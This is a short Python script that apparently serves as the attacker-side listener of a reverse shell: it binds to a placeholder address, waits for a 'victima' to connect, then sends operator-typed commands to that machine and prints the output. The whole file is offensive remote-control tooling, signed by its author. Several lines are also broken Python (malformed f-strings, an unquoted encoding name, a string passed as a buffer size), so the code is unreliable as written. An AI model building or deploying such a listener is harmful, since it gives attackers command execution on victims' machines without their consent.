import time
import socket
import colorama
from colorama import Fore, Back, Style
colorama.init()

server=socket.socket()
server.bind(("youriphere",porthere))
server.listen(1)

while True:
    victima,direccion=server.accept()
    print(f{Fore_MAGENTA}'[*] New Connection: {}'.format(direccion))
    msjBinario=victima.recv(1024)
    msjCodificado=msjBinario.decode(ascii)
    
    if msjCodificado == "1":
        while True:
            opcion = input("[*] Shell@Shell: ")
            victima.send(opcion.encode("ascii"))
            resultado=victima.recv("2048")
            print(resultado)
    else:
        time.sleep(0.5)
        print(f{Fore_RED}"[-] Something went wrong :( [-] ")
        print(f{Fore_CYAN}"[!] Press any key to exit [!]")
        input()
        break
        
#with love, jair david <3